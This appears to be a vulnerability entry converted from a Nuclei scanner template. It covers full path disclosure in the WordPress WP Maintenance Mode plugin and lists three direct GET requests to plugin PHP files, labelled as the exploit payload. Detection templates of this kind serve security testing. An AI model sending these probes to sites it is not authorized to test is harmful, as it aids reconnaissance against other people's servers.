# Vulnerability: WordPress WP Maintenance Mode - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-maintenance-mode-fpd.yaml`)

## Description
WordPress WP Maintenance Mode plugin is vulnerable to full path disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/wp-maintenance-mode/includes/classes/class-wp-maintenance-mode.php
GET {{BaseURL}}/wp-content/plugins/wp-maintenance-mode/includes/classes/class-wp-maintenance-mode-admin.php
GET {{BaseURL}}/wp-content/plugins/wp-maintenance-mode/views/maintenance.php
```

